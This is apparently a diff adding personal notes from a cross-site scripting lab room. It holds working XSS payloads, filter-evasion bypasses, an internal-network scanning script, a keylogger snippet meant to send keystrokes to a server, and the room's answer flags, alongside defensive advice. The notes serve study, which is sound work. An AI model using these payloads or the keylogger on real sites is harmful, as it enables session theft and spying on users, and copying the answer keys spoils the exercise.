@@ -265,3 +265,271 @@ with onmouseover
 test" onmouseover="document.body.style.backgroundColor = 'red';
 
 Answer: JavascriptIsAwesome
+```
+![[Pasted image 20221002203605.png]]
+![[Pasted image 20221002212305.png]]
+![[Pasted image 20221002212407.png]]
+Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.
+Try entering: test" onmouseover="alert('Hover over the image and inspect the image element')"
+*BreakingAnElementsTag*
+Create an onhover event on an image tag, that change the background color of the website to red.
+document.body.style.backgroundColor = "red"
+![[Pasted image 20221002212936.png]]
+*JavascriptIsAwesome*
+
+## Enumeration
+Cross-site scripting can be used for all sorts of mischief, one being the ability to scan a victims internal network and look for open ports. If an attacker is interested in what other devices are connected on the network, they can use Javascript to make requests to a range of IP addresses and determine which one responds.
+On the XSS Playground, go to the IP/Port scanning tab and review a script to scan the internal network.
+Understand the basic proof of concept script.
+Then create a file on your computer with the script, modify it to suit your network and run it. See if it picks up any of your devices that has a webserver running.
+```text
+IP and Port Scanning with XSS
+
+On the application layer your browser has no notion of internal and external IP addresses. So any website is able to tell your browser to request a resource from your internal network.
+
+For example, a website could try to find if your router has a web interface at 192.168.0.1 by:
+
+<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">
+
+Please keep in mind this is a proof of concept and there are many factors that will effect results such as response times, firewall rules, cross origin policies and more. Our browsers can conduct a basic network scan and infer about existing IP's, hostnames and services. As this is a learning exercise assume the factors do not apply here.
+
+The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255
+
+ <script>
+ for (let i = 0; i < 256; i++) {
+  let ip = '192.168.0.' + i
+
+  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
+  document.body.innerHTML += code
+ }
+</script> 
+
+After you've found an valid IP you can then use the same method above and include a port number. However, the method described here only works with web servers (as its looking for the favicon image). A more detailed port scanner can be found here. As previously stated, this page is a proof of concept, you can create scripts which have much more capability.
+
+https://github.com/aabeling/portscan
+```
+### XSS Keylogger
+Javascript can be used for many things, including creating an event to listen for key-presses.
+Navigate to the "Key Logger" part of the XSS playground and complete the challenge.
+```text
+Key-Logger with XSS
+
+Javascript can be used for many things, including creating an event to listen for keypresses.
+
+<script type="text/javascript">
+ let l = ""; // Variable to store key-strokes in
+ document.onkeypress = function (e) { // Event to listen for key presses
+   l += e.key; // If user types, log it to the l variable
+   console.log(l); // update this line to post to your own server
+ }
+</script>
+
+Now you have this script, can you adapt it and post it into the stored xss page. Then start typing on that page and see it appear on the logs page.
+Logs
+Start typing something on the page. It will log here.
+```
+Create your own version of an XSS keylogger and see it appear in the logs part of the site.
+### Filter Evasion
+There are many techniques used to filter malicious payloads that are used with cross-site scripting. It will be your job to bypass 4 commonly used filters.
+Navigate to "Filter Evasion" in the XSS Playground to get started.
+Cross-site scripting are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.
+XSS found in Shopify https://hackerone.com/reports/415484
+$7,500 for XSS found in Steam chat https://hackerone.com/reports/409850
+$2,500 for XSS in HackerOne https://hackerone.com/reports/449351
+XSS found in Instagram https://hackerone.com/reports/283825
+Using:
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+and
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+```text
+<script>
+
+      let inputted = ''
+      let question = 0
+      document.querySelector('#submit-1').addEventListener("click", function() {
+        let chal1El = document.querySelector('#challenge-1')
+        inputted = chal1El.value
+        question = 1
+        document.querySelector('#challenge-1-input').innerHTML = inputted.replace("script", "")
+      });
+
+      document.querySelector('#submit-2').addEventListener("click", async function() {
+        let chal2El = document.querySelector('#challenge-2')
+        inputted = chal2El.value
+        question = 2
+        document.querySelector('#challenge-2-input').innerHTML = inputted.replace("alert", "")
+        crappyCheck()
+      });
+
+      document.querySelector('#submit-3').addEventListener("click", function() {
+        let chal3El = document.querySelector('#challenge-3')
+        inputted = chal3El.value
+        question = 3
+        document.querySelector('#challenge-3-input').innerHTML = inputted.replace("Hello", "")
+      });
+
+      document.querySelector('#submit-4').addEventListener("click", function() {
+        let chal4El = document.querySelector('#challenge-4')
+        inputted = chal4El.value
+        question = 4
+        document.querySelector('#challenge-4-input').innerHTML = inputted.replace("Hello", "").replace("script", "").replace("onerror", "").replace("onsubmit", "").replace("onload", "").replace("onmouseover", "")
+        .replace("onfocus", "").replace("onmouseout", "").replace("onkeypress", "").replace("onchange", "")
+      });
+
+      let alerted = 0
+      let _old_alert = window.alert;
+      window.alert = async function() {
+        if(alerted < 2) {
+          alerted++
+          const response = await checkAnswers()
+          _old_alert.apply(window,arguments);
+          if(alerted == 1) {
+            if(response.success)
+              alert(response.answer)
+          }
+
+        } else {
+          alerted = 0
+        }
+      };
+
+      async function checkAnswers() {
+        return new Promise(async function(resolve, reject) {
+          $.post('/filter-evasion-check', {question: question, answer: inputted}, async function(response) {
+            return resolve(response)
+          })
+        })
+      }
+
+      async function crappyCheck() {
+        const data = await checkAnswers()
+        if(data.success)
+          alert(data.answer)
+      }
+
+    </script>
+
+There are a set of challenges on this page that will require you to bypass particular filters. In every challenge you need to produce an alert on the page that says "Hello". Answers will be in the format of 32 random characters.
+
+1)
+<img src=x onerror=alert("Hello");>
+
+Answer: 3c3cf8d90aaece81710ab9db759352c0
+
+or
+
+<img src=witty onerror=alert("Hello");>
+
+or
+
+<object onerror=alert('Hello')>
+
+2)
+not work
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))";>
+so
+The first two character “> is to escape the current html tag.
+
+When you reference <img src=x, this causes an error because the application is unable to find the resource x. This is intentionally done to make use of the onerror event handler.
+
+Prompt is similar to alert which acts as a proof of concept that the script ran.
+
+Try document.cookie and you should be able to see your current session cookie.
+
+“><iframe src=”x” onerror=prompt(1);>?
+
+“><a href=”x” onerror=promot(1);>?{{2*2}}
+
+<img src="3.gif" onerror="myFunction()"> — which function you want to execute on this 
+
+<img src=witty onerror=confirm("Hello")>
+
+or
+
+<img src=witty onerror=prompt("Hello")>
+
+or
+
+“><iframe src=”x” onerror=prompt("Hello");>
+
+or
+
+“><a href=”x” onerror=prompt("Hello");>
+
+Answer: a2e5ef66f5ff584a01d734ef5edaae91
+
+some page doing this https://artsandculture.google.com/usergallery/img-src-x-onerror-prompt-document-cookie/3QLCc_ESGm35JA
+
+don't enter 
+
+3)
+
+<object onerror=alert('Hello')>
+
+or
+
+<img src="witty" onerror=alert("HHelloello") />
+
+This can be done by just playing some tricks with the word ‘Hello’. Since the word hello is filtered, it will deduct ‘Hello’ from this string ‘HHelloello’ and return ‘Hello’ to the user.
+
+Answer: decba45d0eff17c6eedf1629393bee1d
+
+4)
+
+Since this challenge only filters ‘onerror’, we can replace it with ‘ONERROR’ instead.
+
+<img src=witty ONERROR=alert("HHelloello")>
+
+or
+
+<object ONERROR=alert('HHelloello')>
+
+or
+
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
+
+Answer: 2482d2e8939fc85a9363617782270555
+
+and much more solutions :)
+```
+Bypass the filter that removes any script tags.
+*3c3cf8d90aaece81710ab9db759352c0*
+The word alert is filtered, bypass it.
+*a2e5ef66f5ff584a01d734ef5edaae91*
+The word hello is filtered, bypass it.
+*decba45d0eff17c6eedf1629393bee1d*
+Filtered in challenge 4 is as follows:
+word "Hello"
+script
+onerror
+onsubmit
+onload
+onmouseover
+onfocus
+onmouseout
+onkeypress
+onchange
+*2482d2e8939fc85a9363617782270555*
+
+## Exploitation
+Protection Methods
+There are many ways to prevent XSS, here are the 3 ways to keep cross-site scripting our of your application.
+Escaping - Escape all user input. This means any data your application has received  is secure before rendering it for your end users. By escaping user input, key characters in the data received but the web page will be prevented from being interpreter in any malicious way. For example, you could disallow the < and > characters from being rendered.
+Validating Input - This is the process of ensuring your application is rendering the correct data and preventing malicious data from doing harm to your site, database and users. Input validation is disallowing certain characters from being submit in the first place.
+Sanitising - Lastly, sanitizing data is a strong defence but should not be used to battle XSS attacks alone. Sanitizing user input is especially helpful on sites that allow HTML markup, changing the unacceptable user input into an acceptable format. For example you could sanitise the < character into the HTML entity &#60;
+&#60; Less than &#61; Equals sign &#62; Greater than &#63;
+Other Exploits
+XSS is often overlooked but can have just as much impact as other big impact vulnerabilities. More often than not, its about stringing several vulnerabilities together to produce a bigger/better exploit. Below are some other interesting XSS related tools and websites.
+BeEF is a penetration testing tool that focuses on the web browser. The concept here is that you "hook" a browser (using XSS), then you are able to launch and control a range of different attacks.
+![](https://beefproject.com/images/feature-3.jpg)
+![](https://img.wonderhowto.com/img/original/26/89/63558470394098/0/635584703940982689.jpg)
+BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.
+![](https://pbs.twimg.com/profile_images/537666031192272896/SLVtYItD_400x400.png)
+Download and experiment with BeEF with the XSS playground.
+Take a look at XSS-Payloads.com, download one interesting looking payload and use it on the XSS playground.
+https://github.com/payloadbox/xss-payload-list
+not load :( XSS-Payloads.com
+
+## Notes / Lessons Learned
+[[Brainpan 1]]
+
